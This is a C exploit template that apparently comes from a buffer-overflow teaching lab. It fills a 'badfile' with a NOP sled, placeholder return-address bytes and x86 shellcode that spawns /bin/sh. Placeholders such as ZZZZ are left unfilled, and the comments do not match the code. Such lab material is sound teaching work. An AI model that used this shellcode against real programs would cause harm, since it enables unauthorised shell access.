#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
;

void main(int argc, char **argv)
{
  char buffer[300];
  FILE *badfile;

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 300);

  /* Fill the return address field with a candidate 
        entry point of the malicious code */
  /* XXXX and YYYY are to be filled with the offset 
        and modified return address */
  *((long *) (buffer + 4)) = 0x53;
	
  /* Copy the shellcode to buffer */
  /* ZZZZ is to be filled with the pointer pointing to 
        where the shellcode will be copied*/
  memcpy(ZZZZ, shellcode, sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 300, 1, badfile);
  fclose(badfile);
}